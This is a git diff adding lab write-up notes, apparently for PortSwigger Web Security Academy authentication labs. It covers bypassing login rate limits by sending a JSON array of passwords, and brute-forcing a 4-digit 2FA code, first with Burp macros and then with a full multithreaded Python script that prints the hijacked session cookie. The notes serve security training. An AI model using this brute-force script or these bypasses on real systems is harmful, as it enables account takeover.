@@ -219,16 +219,224 @@ with open("interleaved_passwords.txt", "w") as f:
 
 
 
+---
+
+//Lab: Broken brute-force protection, multiple credentials per request
+
+- try logging in with `wiener : peter` at `/login`
+- it works
+
+<img width="1169" height="387" alt="image" src="https://github.com/user-attachments/assets/22db6029-087f-4787-bfed-63ce048588d3" />
+
+- first try and place valid creds `wiener : peter` in every third request -- but we still get blocked right away after a successful attempt
+- since the request body is in JSON format -- we can try stuffing the entire wordlist inside a list `[]`
+- notice that the response appears to be user carlos account page with a potentially valid session cookie
+
+<img width="1246" height="474" alt="image" src="https://github.com/user-attachments/assets/653b331c-9f7e-47ab-8117-022e3e8edf39" />
+
+- now either right click and select `open response in browser` -- then copy and paste the url onto the browser -- then we get carlos account page -- and lab solved
+- OR we could try pasting the session cookie of carlos `6DY12drlGzwbjcWBVea9Wrr6DxWeSrsy` on our browser cookie storage -- and refresh
 
 
+---
 
 
+//Lab -- 2FA bypass using a brute-force attack
+
+- log in with `carlos : montoya`
+- need to brute force `/login2` for the 4 digit code
+- could use burp intruder + macro -- but would take a long time with burp community
 
 
+#### burp macro
+
+- for burp macro: Settings --> sessions
+- 'Add' a macro
+
+<img width="1003" height="663" alt="image" src="https://github.com/user-attachments/assets/6b0fc2ac-8103-474b-9785-2c3a7988cdf3" />
 
 
+- name the macro 'login as carlos'
+- 'configure item' and choose the GET and POST requests for /login -- as well as GET request for /login2
+- this is all because we need the macro to log us back in every time we get logged out due to every 2 wrong code attempts
+- then 'test the macro' -- to make sure the login is successful
+
+<img width="1267" height="666" alt="image" src="https://github.com/user-attachments/assets/80eccb6e-f56f-454f-9e75-8d804cf91590" />
+
+- then add 'session handling rules'
+- add description 'run macro'
+- add rule action to run macro 'login as carlos'
+
+<img width="1169" height="686" alt="image" src="https://github.com/user-attachments/assets/6e991dc8-d9f4-459d-a3f8-7c683a78dd2f" />
 
 
+- then set the scope to 'include all urls'
+- also make sure `intruder` and `repeater` are both selected in tools scope
+
+<img width="1127" height="679" alt="image" src="https://github.com/user-attachments/assets/d6f9c88f-f9ca-49f5-9609-5ce4b8e549ed" />
+
+
+- now set sniper attack
+- payload to be numbers from 0000-9999
+- max integer digits 4
+- max concurrent requests 1 in resource pool
+
+<img width="1265" height="662" alt="image" src="https://github.com/user-attachments/assets/1e279167-5b92-4764-b418-d4c9a4932104" />
+
+- whenever we got a 302 code -- it signifies a valid code
+- however this takes too long
+
+
+#### CUSTOM PYTHON SCRIPT
+
+- could use a python script -- with multithreading
+
+
+```
+
+import requests
+from bs4 import BeautifulSoup
+import urllib3
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import sys
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+BASE_URL = "https://0ae20093033909e480dcb7af00b000a7.web-security-academy.net"
+LOGIN_URL = f"https://0ae20093033909e480dcb7af00b000a7.web-security-academy.net/login"
+MFA_URL = f"https://0ae20093033909e480dcb7af00b000a7.web-security-academy.net/login2"
+
+USERNAME = "carlos"
+PASSWORD = "montoya"
+
+MAX_THREADS = 15
+
+# Optional: Route through Burp (127.0.0.1:8080) so you can inspect traffic visually
+PROXIES = None 
+# PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+
+FOUND_RESULT = None
+
+def get_mfa_csrf(session):
+    """Logs in as carlos and returns initial MFA CSRF token."""
+    res = session.get(LOGIN_URL, proxies=PROXIES, verify=False)
+    soup = BeautifulSoup(res.text, "html.parser")
+    csrf_token = soup.find("input", {"name": "csrf"})["value"]
+
+    login_data = {
+        "csrf": csrf_token,
+        "username": USERNAME,
+        "password": PASSWORD
+    }
+    session.post(LOGIN_URL, data=login_data, proxies=PROXIES, verify=False)
+
+    res_mfa = session.get(MFA_URL, proxies=PROXIES, verify=False)
+    mfa_soup = BeautifulSoup(res_mfa.text, "html.parser")
+    return mfa_soup.find("input", {"name": "csrf"})["value"]
+
+def test_code_chunk(codes):
+    """Worker task using an isolated requests.Session()."""
+    global FOUND_RESULT
+    
+    session = requests.Session()
+    
+    try:
+        mfa_csrf = get_mfa_csrf(session)
+    except Exception:
+        return None
+
+    failed_attempts = 0
+
+    for code in codes:
+        if FOUND_RESULT:
+            return None
+
+        mfa_code = f"{code:04d}"
+        mfa_payload = {"csrf": mfa_csrf, "mfa-code": mfa_code}
+
+        try:
+            res = session.post(
+                MFA_URL, 
+                data=mfa_payload, 
+                allow_redirects=False, 
+                proxies=PROXIES, 
+                verify=False
+            )
+            failed_attempts += 1
+
+            # Check for successful MFA bypass (302 Redirect to /my-account)
+            if res.status_code == 302 and "/my-account" in res.headers.get("Location", ""):
+                
+                # Extract session cookies from the response and session jar
+                cookies_dict = session.cookies.get_dict()
+                cookie_str = "; ".join([f"{k}={v}" for k, v in cookies_dict.items()])
+                
+                FOUND_RESULT = {
+                    "code": mfa_code,
+                    "cookies": cookie_str,
+                    "location": res.headers.get("Location")
+                }
+                
+                print("\n\n" + "="*50)
+                print(f"[!] SUCCESS! MFA Code: {mfa_code}")
+                print(f"[!] Redirect Location: {res.headers.get('Location')}")
+                print(f"[!] Authenticated Session Cookie:\n    {cookie_str}")
+                print("="*50 + "\n")
+                
+                return FOUND_RESULT
+
+            # Re-authenticate every 2 attempts or on redirect back to /login
+            if failed_attempts >= 2 or (res.status_code == 302 and "/login" in res.headers.get("Location", "")):
+                mfa_csrf = get_mfa_csrf(session)
+                failed_attempts = 0
+            else:
+                res_mfa = session.get(MFA_URL, proxies=PROXIES, verify=False)
+                mfa_soup = BeautifulSoup(res_mfa.text, "html.parser")
+                mfa_csrf = mfa_soup.find("input", {"name": "csrf"})["value"]
+
+        except Exception:
+            try:
+                mfa_csrf = get_mfa_csrf(session)
+                failed_attempts = 0
+            except Exception:
+                pass
+
+    return None
+
+def main():
+    print(f"[+] Starting Multithreaded MFA Brute Force ({MAX_THREADS} threads)...")
+    
+    all_codes = list(range(0, 10000))
+    chunk_size = 20
+    chunks = [all_codes[i:i + chunk_size] for i in range(0, len(all_codes), chunk_size)]
+
+    tested_count = 0
+
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+        futures = {executor.submit(test_code_chunk, chunk): chunk for chunk in chunks}
+
+        for future in as_completed(futures):
+            if FOUND_RESULT:
+                executor.shutdown(wait=False, cancel_futures=True)
+                break
+            
+            tested_count += len(futures[future])
+            print(f"[*] Tested ~{tested_count}/10000 codes...", end="\r")
+
+if __name__ == "__main__":
+    main()
+
+```
+
+- once we got the cookie for the successful session -- we paste it in the browser
+- and navigate to `/my-account`
+
+<img width="581" height="185" alt="image" src="https://github.com/user-attachments/assets/85fb4553-f3f5-4e62-a784-b4389f3777c1" />
+
+
+- and lab solved finally
+
+<img width="1159" height="798" alt="image" src="https://github.com/user-attachments/assets/e06ae69e-c222-4a7f-9f0f-1185b78823e8" />
 
 
 
